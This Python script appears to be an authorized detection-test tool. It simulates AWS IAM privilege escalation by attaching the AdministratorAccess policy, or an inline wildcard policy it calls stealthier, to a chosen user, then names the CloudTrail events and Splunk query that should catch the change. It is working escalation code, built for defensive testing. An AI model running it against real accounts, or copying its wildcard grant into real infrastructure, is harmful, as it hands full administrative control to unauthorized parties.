#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║              ATTACK SIMULATION — AUTHORIZED USE ONLY                        ║
║  CDET-004: Admin Policy Attached to IAM Principal                            ║
║  Tactic: Privilege Escalation | T1078.004 — Valid Accounts: Cloud Accounts   ║
║                                                                              ║
║  This script simulates IAM privilege escalation via admin policy attachment. ║
║  Run ONLY in authorized test environments with explicit written approval.    ║
║  Unauthorized use against production systems may violate computer fraud laws.║
╚══════════════════════════════════════════════════════════════════════════════╝

Usage:
    # Dry-run (default — prints actions only):
    python simulate.py --target-user svc-cdet001-simulation-user

    # Execute managed policy attachment:
    python simulate.py --target-user svc-cdet001-simulation-user --execute

    # Execute inline wildcard policy attachment (stealthier):
    python simulate.py --target-user svc-cdet001-simulation-user --execute --inline

    # Execute with cleanup:
    python simulate.py --target-user svc-cdet001-simulation-user --execute --cleanup

    # Cleanup only (remove previously attached policies):
    python simulate.py --target-user svc-cdet001-simulation-user --execute --cleanup-only
"""

import argparse
import json
import logging
import sys
import time
from typing import Optional

import boto3
from botocore.exceptions import ClientError

# ---------------------------------------------------------------------------
# Logging setup
# ---------------------------------------------------------------------------
logging.basicConfig(
    format="%(asctime)s [%(levelname)s] %(name)s — %(message)s",
    datefmt="%Y-%m-%dT%H:%M:%SZ",
    level=logging.INFO,
    stream=sys.stdout,
)
log = logging.getLogger("cdet004-sim")

ADMIN_POLICY_ARN = "arn:aws:iam::aws:policy/AdministratorAccess"
INLINE_POLICY_NAME = "cdet004-simulation-admin-inline"

WILDCARD_POLICY_DOCUMENT = {
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "Cdet004SimulationFullAccess",
            "Effect": "Allow",
            "Action": "*",
            "Resource": "*",
        }
    ],
}


# ---------------------------------------------------------------------------
# Managed policy variant
# ---------------------------------------------------------------------------

def attach_managed_admin_policy(
    iam_client,
    target_user: str,
    dry_run: bool,
) -> bool:
    """
    Attach AdministratorAccess managed policy to target user.

    WARNING: This grants full AWS administrative access.
    CloudTrail event: AttachUserPolicy
    """
    if dry_run:
        log.info("[DRY-RUN] Would call: iam.attach_user_policy(UserName='%s', PolicyArn='%s')", target_user, ADMIN_POLICY_ARN)
        log.info("[DRY-RUN] CloudTrail event generated: AttachUserPolicy")
        return True

    log.warning("EXECUTING: iam.attach_user_policy(UserName='%s', PolicyArn='%s')", target_user, ADMIN_POLICY_ARN)
    log.warning("This grants AdministratorAccess (full AWS access) to: %s", target_user)
    try:
        iam_client.attach_user_policy(UserName=target_user, PolicyArn=ADMIN_POLICY_ARN)
        log.info("Attached AdministratorAccess to user: %s", target_user)
        return True
    except ClientError as exc:
        log.error("Failed to attach policy to '%s': %s", target_user, exc)
        return False


def detach_managed_admin_policy(
    iam_client,
    target_user: str,
    dry_run: bool,
) -> None:
    """Detach AdministratorAccess managed policy from target user."""
    if dry_run:
        log.info("[DRY-RUN] Would call: iam.detach_user_policy(UserName='%s', PolicyArn='%s')", target_user, ADMIN_POLICY_ARN)
        return

    log.warning("EXECUTING: iam.detach_user_policy(UserName='%s', PolicyArn='%s')", target_user, ADMIN_POLICY_ARN)
    try:
        iam_client.detach_user_policy(UserName=target_user, PolicyArn=ADMIN_POLICY_ARN)
        log.info("Detached AdministratorAccess from user: %s", target_user)
    except ClientError as exc:
        if exc.response["Error"]["Code"] != "NoSuchEntity":
            log.error("Failed to detach policy from '%s': %s", target_user, exc)


# ---------------------------------------------------------------------------
# Inline policy variant
# ---------------------------------------------------------------------------

def attach_inline_admin_policy(
    iam_client,
    target_user: str,
    dry_run: bool,
) -> bool:
    """
    Attach an inline wildcard policy to the target user (stealthier variant).

    WARNING: This grants full AWS administrative access via inline policy.
    Inline policies do NOT appear in list-attached-user-policies.
    CloudTrail event: PutUserPolicy
    """
    policy_doc_str = json.dumps(WILDCARD_POLICY_DOCUMENT)

    if dry_run:
        log.info(
            "[DRY-RUN] Would call: iam.put_user_policy(UserName='%s', PolicyName='%s', PolicyDocument=...)",
            target_user,
            INLINE_POLICY_NAME,
        )
        log.info("[DRY-RUN] Policy document: %s", policy_doc_str)
        log.info("[DRY-RUN] CloudTrail event generated: PutUserPolicy")
        log.info("[DRY-RUN] Note: inline policy does NOT appear in list-attached-user-policies")
        return True

    # WARNING: This attaches a wildcard inline policy granting full admin access.
    log.warning(
        "EXECUTING: iam.put_user_policy(UserName='%s', PolicyName='%s')",
        target_user,
        INLINE_POLICY_NAME,
    )
    log.warning("Inline policy grants Action:* on Resource:* — full admin access")
    try:
        iam_client.put_user_policy(
            UserName=target_user,
            PolicyName=INLINE_POLICY_NAME,
            PolicyDocument=policy_doc_str,
        )
        log.info("Attached inline admin policy '%s' to user: %s", INLINE_POLICY_NAME, target_user)
        return True
    except ClientError as exc:
        log.error("Failed to put inline policy on '%s': %s", target_user, exc)
        return False


def delete_inline_admin_policy(
    iam_client,
    target_user: str,
    dry_run: bool,
) -> None:
    """Delete the inline admin policy from target user."""
    if dry_run:
        log.info(
            "[DRY-RUN] Would call: iam.delete_user_policy(UserName='%s', PolicyName='%s')",
            target_user,
            INLINE_POLICY_NAME,
        )
        return

    log.warning(
        "EXECUTING: iam.delete_user_policy(UserName='%s', PolicyName='%s')",
        target_user,
        INLINE_POLICY_NAME,
    )
    try:
        iam_client.delete_user_policy(UserName=target_user, PolicyName=INLINE_POLICY_NAME)
        log.info("Deleted inline policy from user: %s", target_user)
    except ClientError as exc:
        if exc.response["Error"]["Code"] != "NoSuchEntity":
            log.error("Failed to delete inline policy from '%s': %s", target_user, exc)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="CDET-004: Simulate admin policy attachment to IAM principal (T1078.004)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python simulate.py --target-user test-user
  python simulate.py --target-user test-user --execute
  python simulate.py --target-user test-user --execute --inline
  python simulate.py --target-user test-user --execute --cleanup
  python simulate.py --target-user test-user --execute --cleanup-only
        """,
    )
    parser.add_argument(
        "--target-user",
        type=str,
        required=True,
        help="Existing IAM username to escalate privileges for",
    )
    parser.add_argument(
        "--region",
        type=str,
        default="us-east-1",
        help="AWS region (default: us-east-1)",
    )
    parser.add_argument(
        "--execute",
        action="store_true",
        default=False,
        help="Actually execute AWS API calls. Without this flag, runs in dry-run mode.",
    )
    parser.add_argument(
        "--inline",
        action="store_true",
        default=False,
        help="Use inline policy variant (PutUserPolicy) instead of managed policy (AttachUserPolicy)",
    )
    parser.add_argument(
        "--cleanup",
        action="store_true",
        default=False,
        help="Remove attached policies after simulation (requires --execute)",
    )
    parser.add_argument(
        "--cleanup-only",
        action="store_true",
        default=False,
        help="Skip simulation, only clean up previously attached policies (requires --execute)",
    )
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    dry_run = not args.execute

    if dry_run:
        log.info("=" * 70)
        log.info("DRY-RUN MODE — No AWS API calls will be made")
        log.info("=" * 70)
    else:
        log.warning("=" * 70)
        log.warning("EXECUTE MODE — Real AWS API calls WILL be made")
        log.warning("Admin privileges will be granted to: %s", args.target_user)
        log.warning("=" * 70)
        time.sleep(2)

    # Build boto3 session — no hardcoded credentials
    session = boto3.Session(region_name=args.region)
    iam = session.client("iam")
    sts = session.client("sts")

    # Verify caller identity
    try:
        identity = sts.get_caller_identity()
        log.info("Running as: %s (Account: %s)", identity["Arn"], identity["Account"])
    except ClientError as exc:
        log.error("Cannot determine caller identity: %s", exc)
        return 1

    # Cleanup-only mode
    if args.cleanup_only:
        log.info("Cleanup-only: removing policies from '%s'", args.target_user)
        detach_managed_admin_policy(iam, args.target_user, dry_run)
        delete_inline_admin_policy(iam, args.target_user, dry_run)
        return 0

    # Determine variant
    if args.inline:
        log.info("Variant: Inline wildcard policy (PutUserPolicy)")
        log.info("CloudTrail event: PutUserPolicy | requestParameters.policyDocument contains Action:*")
        success = attach_inline_admin_policy(iam, args.target_user, dry_run)
    else:
        log.info("Variant: AWS managed AdministratorAccess (AttachUserPolicy)")
        log.info("CloudTrail event: AttachUserPolicy | requestParameters.policyArn=arn:aws:iam::aws:policy/AdministratorAccess")
        success = attach_managed_admin_policy(iam, args.target_user, dry_run)

    if not success:
        log.error("Simulation failed")
        return 1

    log.info("Simulation complete.")
    log.info(
        "Expected CDET-004 alert in Splunk: "
        "index=aws_cloudtrail eventName IN (AttachUserPolicy,PutUserPolicy) "
        "requestParameters.userName=%s",
        args.target_user,
    )

    # Optional cleanup
    if args.cleanup:
        log.info("Cleanup: waiting 30 seconds for CloudTrail event propagation...")
        if not dry_run:
            time.sleep(30)
        if args.inline:
            delete_inline_admin_policy(iam, args.target_user, dry_run)
        else:
            detach_managed_admin_policy(iam, args.target_user, dry_run)

    return 0


if __name__ == "__main__":
    sys.exit(main())
